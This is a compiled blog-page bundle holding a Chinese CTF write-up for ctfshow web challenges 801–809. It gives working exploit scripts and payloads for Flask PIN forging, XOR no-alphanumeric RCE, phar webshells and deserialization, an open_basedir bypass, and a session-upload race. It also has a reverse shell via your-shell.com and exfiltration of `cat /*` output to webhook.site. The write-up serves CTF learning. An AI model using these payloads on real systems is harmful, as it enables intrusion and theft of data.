import{Bt as e,Gn as t,Gt as n,H as r,Qn as i,Rt as a,V as o,X as s,_n as c}from"./framework.DfD1zdSt.js";import{t as l}from"./theme.DMgGaAyl.js";import"./chunks/vue-i18n.BSMUyWAh.js";import{a as u,i as d}from"./chunks/vue-router.DZdD3Cav.js";var f={__name:`ctfshow-常用姿势`,setup(f,{expose:p}){let m=t(JSON.parse(`{"title":"ctfshow-常用姿势","description":"","frontmatter":{"title":"ctfshow-常用姿势","date":"2024-12-01 19:48:14","tags":["ctfshow"],"categories":["学习笔记"],"firstImage":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012001827.png"},"headers":[],"relativePath":"pages/posts/ctfshow-常用姿势.md"}`)),h=u(),g=d(),_=Object.assign(g.meta.frontmatter||{},m.value?.frontmatter||{});return h.currentRoute.value.data=m.value,e(`valaxy:frontmatter`,_),globalThis.$frontmatter=_,p({frontmatter:{title:`ctfshow-常用姿势`,date:`2024-12-01 19:48:14`,tags:[`ctfshow`],categories:[`学习笔记`]}}),(e,t)=>{let u=l;return a(),r(u,{frontmatter:i(_)},{"main-content-md":c(()=>[...t[0]||=[o(`p`,null,`摘要：flask算PIN web801 先获取mac地址 先把冒号去了，然后十六进制再转十进制 得到 我们找个flask算pin的脚本 这里我们需要机器码，我们先访问/proc/self/cgroup 得到 然后再访问/etc/machine-id或者/proc/sys/kernel/random/boo。`,-1),o(`p`,null,`<!-- more -->`,-1),o(`h2`,{id:`flask算pin`,tabindex:`-1`},[o(`strong`,null,`flask算PIN`),s(),o(`a`,{class:`header-anchor`,href:`#flask算pin`,"aria-label":`Permalink to "**flask算PIN**"`},`​`)],-1),o(`h3`,{id:`web801`,tabindex:`-1`},[s(`web801 `),o(`a`,{class:`header-anchor`,href:`#web801`,"aria-label":`Permalink to "web801"`},`​`)],-1),o(`p`,null,`先获取mac地址`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`/file?filename=/sys/class/net/eth0/address
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012001827.png`,alt:`image-20241201200156755`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`先把冒号去了，然后十六进制再转十进制`,-1),o(`p`,null,`得到`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`2485377605532
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们找个flask算pin的脚本`,-1),o(`div`,{class:`language-py`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`py`),o(`pre`,null,[o(`code`,{class:`language-py`},`import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
import typing as t
username='root'
app = Flask(__name__)
modname=getattr(app, "__module__", t.cast(object, app).__class__.__module__)
mod=sys.modules.get(modname)
mod = getattr(mod, "__file__", None)

probably_public_bits = [
    username, #用户名
    modname,  #一般固定为flask.app
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask
    '/usr/local/lib/python3.8/site-packages/flask/app.py',   #主程序（app.py）运行的绝对路径
]
print(probably_public_bits)
mac ='02:42:ac:0c:ac:28'.replace(':','')
mac=str(int(mac,base=16))
private_bits = [
   mac,#mac地址十进制
 "机器码"
     ]
print(private_bits)
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`这里我们需要机器码，我们先访问**/proc/self/cgroup**`,-1),o(`p`,null,`得到`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`d1b9d0725f0d084e96c039bb557a13646b2c418388ed006646ab107f3c435778
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`然后再访问**/etc/machine-id或者/proc/sys/kernel/random/boot_id**`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`225374fa-04bc-4346-9f39-48fa82829ca9
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`拼接一下得到机器码`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`225374fa-04bc-4346-9f39-48fa82829ca9d1b9d0725f0d084e96c039bb557a13646b2c418388ed006646ab107f3c435778
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们到脚里修改机器码，运行得到pin值`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012007621.png`,alt:``,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`我们访问console，将密码填进去`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012008128.png`,alt:`image-20241201200825063`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`得到flag`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`import os
os.popen('cat /f*').read();
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012015293.png`,alt:`image-20241201201555230`,loading:`lazy`,decoding:`async`})],-1),o(`h2`,{id:`无字母数字命令执行`,tabindex:`-1`},[o(`strong`,null,`无字母数字命令执行`),s(),o(`a`,{class:`header-anchor`,href:`#无字母数字命令执行`,"aria-label":`Permalink to "**无字母数字命令执行**"`},`​`)],-1),o(`h3`,{id:`web802`,tabindex:`-1`},[s(`web802 `),o(`a`,{class:`header-anchor`,href:`#web802`,"aria-label":`Permalink to "web802"`},`​`)],-1),o(`p`,null,[o(`a`,{href:`https://blog.csdn.net/miuzzx/article/details/109143413`,target:`_blank`,rel:`noreferrer`},`https://blog.csdn.net/miuzzx/article/details/109143413`)],-1),o(`p`,null,`用这套无字母数字rce脚本`,-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) {
    for ($j=0; $j <256 ; $j++) {

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z]|[0-9]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
            echo "";
        }

        else{
            $a='%'.$hex_i;
            $b='%'.$hex_j;
            $c=(urldecode($a)^urldecode($b));
            if (ord($c)>=32&ord($c)<=126) {
                $contents=$contents.$c." ".$a." ".$b."\\n";
            }
        }

    }
}
fwrite($myfile,$contents);
fclose($myfile);

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到xor_rce文件后，运行配套python脚本`,-1),o(`div`,{class:`language-py`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`py`),o(`pre`,null,[o(`code`,{class:`language-py`},`# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os

def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\\"" + s1 + "\\"^\\"" + s2 + "\\")"
    return (output)

while True:
    param = action(input("\\n[+] your function：")) + action(input("[+] your command：")) + ";"
    print(param)

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012027248.png`,alt:`image-20241201202702195`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`输入方法和命令，我们进行传参，成功执行命令`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012027341.png`,alt:`image-20241201202722292`,loading:`lazy`,decoding:`async`})],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`system(tac flag.php)

("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%08%01%03%00%06%0c%01%07%00%0b%08%0b"^"%7c%60%60%20%60%60%60%60%2e%7b%60%7b");
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`传入得到flag`,-1),o(`h2`,{id:`phar文件包含`,tabindex:`-1`},[o(`strong`,null,`phar文件包含`),s(),o(`a`,{class:`header-anchor`,href:`#phar文件包含`,"aria-label":`Permalink to "**phar文件包含**"`},`​`)],-1),o(`h3`,{id:`web803`,tabindex:`-1`},[s(`web803 `),o(`a`,{class:`header-anchor`,href:`#web803`,"aria-label":`Permalink to "web803"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php

error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们看到题目web目录下没有写权限，需要写到其他地方比如/tmp下`,-1),o(`p`,null,`首先生成phar文件`,-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php 
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php eval(\\$_POST[1]);?>");
$phar->stopBuffering();
?>

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`接着上传文件`,-1),o(`div`,{class:`language-python`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`python`),o(`pre`,null,[o(`code`,{class:`language-python`},`import requests  
url="http://d4d6bb42-e30d-4ed7-b823-baa8ec7e8cc8.challenge.ctf.show/index.php"
data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
data2={'file':'phar:///tmp/a.phar/a','content':'123','1':'system("cat f*");'}
requests.post(url,data=data1)
r=requests.post(url,data=data2)
print(r.text)

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到flag`,-1),o(`h2`,{id:`phar反序列化`,tabindex:`-1`},[o(`strong`,null,`phar反序列化`),s(),o(`a`,{class:`header-anchor`,href:`#phar反序列化`,"aria-label":`Permalink to "**phar反序列化**"`},`​`)],-1),o(`h3`,{id:`web804`,tabindex:`-1`},[s(`web804 `),o(`a`,{class:`header-anchor`,href:`#web804`,"aria-label":`Permalink to "web804"`},`​`)],-1),o(`p`,null,[o(`a`,{href:`https://z3r4y.blog.csdn.net/article/details/134479335`,target:`_blank`,rel:`noreferrer`},`https://z3r4y.blog.csdn.net/article/details/134479335`)],-1),o(`p`,null,[o(`a`,{href:`https://blog.csdn.net/uuzeray/article/details/134362720`,target:`_blank`,rel:`noreferrer`},`【Web】Phar反序列化相关例题wp_newstarctf pharone-CSDN博客`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

error_reporting(0);
highlight_file(__FILE__);

class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们发现代码里有个unlink函数，那这题大概率是phar反序列化`,-1),o(`p`,null,`我们构造poc链`,-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}
$a=new hacker();
$a->code="system('cat f*');";
 
 
$phar = new Phar("test.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
 
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`接着上传文件`,-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`import requests
url="http://5d5c1d43-55e2-45d0-877a-ef8da113932e.challenge.ctf.show/"
 
file={'file':'/tmp/a.phar','content':open('test.phar','rb').read()}
data={'file':'phar:///tmp/a.phar','content':'suibian'}
requests.post(url,data=file)
r=requests.post(url,data=data)
print(r.text)
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到flag`,-1),o(`h2`,{id:`open-basedir绕过`,tabindex:`-1`},[o(`strong`,null,`open_basedir绕过`),s(),o(`a`,{class:`header-anchor`,href:`#open-basedir绕过`,"aria-label":`Permalink to "**open_basedir绕过**"`},`​`)],-1),o(`h3`,{id:`web805`,tabindex:`-1`},[s(`web805 `),o(`a`,{class:`header-anchor`,href:`#web805`,"aria-label":`Permalink to "web805"`},`​`)],-1),o(`p`,null,[o(`a`,{href:`https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkFoD%3Dq0QY%2BUx%3Dx&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-12`,target:`_blank`,rel:`noreferrer`},`从0学习bypass open_basedir姿势 - 先知社区`)],-1),o(`p`,null,`我们看一下phpinfo();`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412021938090.png`,alt:`image-20241202193843967`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`可以看到命令执行函数都被ban了，那我们读文件可以用readfile或include`,-1),o(`p`,null,`查看目录`,-1),o(`div`,{class:`language-bash`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`bash`),o(`pre`,null,[o(`code`,{class:`language-bash`},`1=mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`得到flag`,-1),o(`div`,{class:`language-bash`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`bash`),o(`pre`,null,[o(`code`,{class:`language-bash`},`1=mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/ctfshowflag');
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h2`,{id:`php无参rce`,tabindex:`-1`},[o(`strong`,null,`php无参RCE`),s(),o(`a`,{class:`header-anchor`,href:`#php无参rce`,"aria-label":`Permalink to "**php无参RCE**"`},`​`)],-1),o(`h3`,{id:`web806`,tabindex:`-1`},[s(`web806 `),o(`a`,{class:`header-anchor`,href:`#web806`,"aria-label":`Permalink to "web806"`},`​`)],-1),o(`p`,null,[o(`a`,{href:`https://xz.aliyun.com/t/9360`,target:`_blank`,rel:`noreferrer`},`https://xz.aliyun.com/t/9360`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

highlight_file(__FILE__);

if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,[o(`code`,null,`[^\\W]+`)]),s(`：`)],-1),o(`ul`,null,[o(`li`,null,[o(`code`,null,`[^\\W]`),s(` 是一个字符类，`),o(`code`,null,`^\\W`),s(` 意味着“匹配不是非单词字符（`),o(`code`,null,`\\W`),s(`）的字符”，因此它等同于 `),o(`code`,null,`[a-zA-Z0-9_]`),s(`，也就是字母、数字或下划线。`)]),o(`li`,null,[o(`code`,null,`+`),s(` 表示“匹配一个或多个”这样的字符。`)])],-1),o(`p`,null,[s(`所以 `),o(`code`,null,`/[^\\W]+/`),s(` 匹配一个或多个字母、数字或下划线，表示一个词或标识符。`)],-1),o(`p`,null,[o(`strong`,null,[o(`code`,null,`\\(`),s(` 和 `),o(`code`,null,`\\)`)]),s(`：`)],-1),o(`ul`,null,[o(`li`,null,[s(`这两个是转义字符，用来匹配字面上的圆括号 `),o(`code`,null,`(`),s(` 和 `),o(`code`,null,`)`),s(`。`),o(`code`,null,`(`),s(` 和 `),o(`code`,null,`)`),s(` 在正则表达式中有特殊意义（分别表示捕获组和分组），所以在这里需要用 `),o(`code`,null,`\\`),s(` 进行转义，表示它们是字面意义上的括号。`)])],-1),o(`p`,null,[o(`strong`,null,[o(`code`,null,`(?R)?`)]),s(`：`)],-1),o(`ul`,null,[o(`li`,null,[o(`code`,null,`(?R)`),s(` 是一个递归调用，在正则表达式中，`),o(`code`,null,`(?R)`),s(` 表示递归地匹配整个正则表达式（即自调用）。这意味着在括号内可以再次匹配相同的模式。`)]),o(`li`,null,[o(`code`,null,`?`),s(` 表示这个递归是可选的，也就是说括号内的内容不一定要再次进行递归匹配。`)])],-1),o(`p`,null,`payload`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?code=eval(end(current(get_defined_vars())));&Z3r4y=system('cat /ctfshowflag');
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h2`,{id:`shell反弹`,tabindex:`-1`},[s(`shell反弹 `),o(`a`,{class:`header-anchor`,href:`#shell反弹`,"aria-label":`Permalink to "shell反弹"`},`​`)],-1),o(`h3`,{id:`web807`,tabindex:`-1`},[s(`web807 `),o(`a`,{class:`header-anchor`,href:`#web807`,"aria-label":`Permalink to "web807"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

error_reporting(0);
highlight_file(__FILE__);
$url = $_GET['url'];

$schema = substr($url,0,8);

if($schema==="https://"){
    shell_exec("curl $url");
}
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`法1：反弹shell`)],-1),o(`p`,null,[s(`推荐一个网站：`),o(`a`,{href:`https://your-shell.com/`,target:`_blank`,rel:`noreferrer`},`https://your-shell.com/`)],-1),o(`p`,null,`payload`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?url=https://your-shell.com/ip:1337 | sh
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`ip为自己服务器ip`,-1),o(`p`,null,`先在服务器上监听1337端口`,-1),o(`p`,null,`然后找flag`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412022017917.png`,alt:`image-20241202201756820`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`法2：vps外带`)],-1),o(`p`,null,[s(`我们利用`),o(`a`,{href:`https://webhook.site/%E8%BF%9B%E8%A1%8Cflag%E5%A4%96%E5%B8%A6`,target:`_blank`,rel:`noreferrer`},`https://webhook.site/进行flag外带`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,"?url=https://webhook.site/25364e81-eb5f-4bed-bdd8-ef0954269270?flag=`cat /*`\n")]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412022023601.png`,alt:`image-20241202202319556`,loading:`lazy`,decoding:`async`})],-1),o(`h2`,{id:`卡临时文件包含`,tabindex:`-1`},[s(`卡临时文件包含 `),o(`a`,{class:`header-anchor`,href:`#卡临时文件包含`,"aria-label":`Permalink to "卡临时文件包含"`},`​`)],-1),o(`h3`,{id:`web808`,tabindex:`-1`},[s(`web808 `),o(`a`,{class:`header-anchor`,href:`#web808`,"aria-label":`Permalink to "web808"`},`​`)],-1),o(`div`,{class:`language-php`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`php`),o(`pre`,null,[o(`code`,{class:`language-php`},`<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-20 11:01:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-20 22:18:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
$file = $_GET['file'];

if(isset($file) && !preg_match("/input|data|phar|log/i",$file)){
    include $file;
}else{
    show_source(__FILE__);
    print_r(scandir("/tmp"));
}

Array ( [0] => . [1] => .. )
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`临时文件的复现难度很大，建议直接session文件包含`,-1),o(`p`,null,`用下面脚本打`,-1),o(`div`,{class:`language-python`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`python`),o(`pre`,null,[o(`code`,{class:`language-python`},`import requests
import threading
 
session = requests.session()
 
sess = "ctfshow"
 
file_name = "/var/www/html/1.php"
file_content = '<?php eval($_POST[1]);?>'
 
url = "http://3fd00eb3-48d8-4a13-99e6-4dcced70454f.challenge.ctf.show/"
 
data = {
    "PHP_SESSION_UPLOAD_PROGRESS": f"<?php echo 'success!'; file_put_contents('{file_name}','{file_content}');?>"
}
 
file = {
    'file': 'ctfshow'
}
 
cookies = {
    'PHPSESSID': sess
}
 
 
def write():
    while True:
        r = session.post(url=url, data=data, files=file, cookies=cookies)
 
 
def read():
    while True:
        r = session.post(url=url + "?file=/tmp/sess_ctfshow")
        if "success" in r.text:
            print("shell 地址为：" + url + "1.php")
            exit()
 
 
if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write).start()
        for i in range(1, 30):
            threading.Thread(target=read).start()
    event.set()
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`能不能出看运气，超级讨厌这种题`,-1),o(`h2`,{id:`pear文件包含-rce`,tabindex:`-1`},[o(`strong`,null,`pear文件包含/RCE`),s(),o(`a`,{class:`header-anchor`,href:`#pear文件包含-rce`,"aria-label":`Permalink to "**pear文件包含/RCE**"`},`​`)],-1),o(`h3`,{id:`web809`,tabindex:`-1`},[s(`web809 `),o(`a`,{class:`header-anchor`,href:`#web809`,"aria-label":`Permalink to "web809"`},`​`)],-1)]]),"main-header":c(()=>[n(e.$slots,`main-header`)]),"main-header-after":c(()=>[n(e.$slots,`main-header-after`)]),"main-nav":c(()=>[n(e.$slots,`main-nav`)]),"main-content-before":c(()=>[n(e.$slots,`main-content-before`)]),"main-content":c(()=>[n(e.$slots,`main-content`)]),"main-content-after":c(()=>[n(e.$slots,`main-content-after`)]),"main-nav-before":c(()=>[n(e.$slots,`main-nav-before`)]),"main-nav-after":c(()=>[n(e.$slots,`main-nav-after`)]),comment:c(()=>[n(e.$slots,`comment`)]),footer:c(()=>[n(e.$slots,`footer`)]),aside:c(()=>[n(e.$slots,`aside`)]),"aside-custom":c(()=>[n(e.$slots,`aside-custom`)]),default:c(()=>[n(e.$slots,`default`)]),_:3},8,[`frontmatter`])}}};export{f as default};